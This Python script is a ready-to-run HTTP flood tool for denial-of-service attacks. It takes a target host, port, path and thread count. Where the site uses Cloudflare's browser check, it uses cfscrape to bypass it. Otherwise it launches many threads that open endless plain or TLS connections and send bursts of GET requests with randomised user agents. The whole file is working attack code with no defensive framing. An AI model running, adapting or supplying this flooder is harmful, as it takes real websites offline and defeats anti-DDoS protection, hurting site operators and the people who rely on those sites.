#!/usr/bin/python3
# -*- coding: utf-8 -*-
import cfscrape, socket, ssl, urllib.request, urllib.error
import _thread, threading, random, argparse
import randomheaders as rh
from time import sleep
from sys import exit

def main():
    x = 0
    global go
    go = threading.Event()

    if not is_protected_by_cf():
        print("{}[*]{} CloudFlare protection mechanism was not generated".format(G,end))
        print("{}[*]{} Starting {} threads...".format(G,end,args.threads))
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())
        sleep(5)
        print("{}[*]{} Ordnance initiated".format(G,end))
        for x in range(args.threads):
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
        go.set()
    else:
        print("{}[*]{} CloudFlare protection mechanism was generated".format(M,end))
        print("{}[*]{} Ordnance initiated".format(G,end))
        for x in range(args.threads):
            CFReq(x + 1).start()
        go.set()

def usage():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', nargs="?", help="Web server, i.e: example.com",required=True)
    parser.add_argument('-p', '--port', default=80,help="Port number (Default 80)", type=int)
    parser.add_argument('-d', '--dir', default="", help="Web path, i.e: admin/index.php (Default: /)")
    parser.add_argument('-t', '--threads', default=100, help="Number of threads (Default 100)", type=int)
    parser.add_argument('-s', '--ssl', dest="ssl", action="store_false", help="HTTP/HTTPS (Default HTTP)")
    return parser.parse_args()

# Check UA generation
def is_protected_by_cf():
    try:
        conn = urllib.request.urlopen(url)
    except urllib.error.HTTPError as e:
        print('{}[*]{} HTTPError: {}'.format(R,end,e.code))
        exit()
    except urllib.error.URLError as e:
        print('{}[*]{} URLError: {}'.format(R,end,e.reason))
        exit()
    else:
        response = conn.read()

    if "Checking your browser before accessing" in str(response):
        return True
    else:
        return False

def set_request():
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: {}\r\n".format(rh.generate('agents'))
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)

# When args.ssl => store_false
class RequestDefaultHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s.send(str.encode(random.choice(request_list)))
                # print("Request sent @", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(random.choice(request_list)))
                except:
                    s.close()
            except:
                s.close()

# When args.ssl => store_true
class RequestDefaultHTTPS(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
                                    ssl_version=ssl.PROTOCOL_SSLv23)
                s.send(str.encode(random.choice(request_list)))
                # print("Request sent @", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(random.choice(request_list)))
                except:
                    s.close()
            except:
                s.close()

# When CF is present
class CFReq(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            scraper = cfscrape.create_scraper()

            for y in range(50):
                scraper.get(url) # If HTTP Post required, change to scraper.post(url)

if __name__ == "__main__":
    G, R, M, end = '\033[92m', '\033[91m', '\033[95m', '\033[0m'
    args = usage()
    request_list = []

    if args.ssl:
        url = "http://" + args.host + ":" +str(args.port)
    else:
        url = "https://" + args.host + ":" + str(args.port)

    if args.dir != None:
        url = url + "/{}".format(args.dir)

    print("{}[*]{} Checking URL: {}".format(M,end,url))

    main()
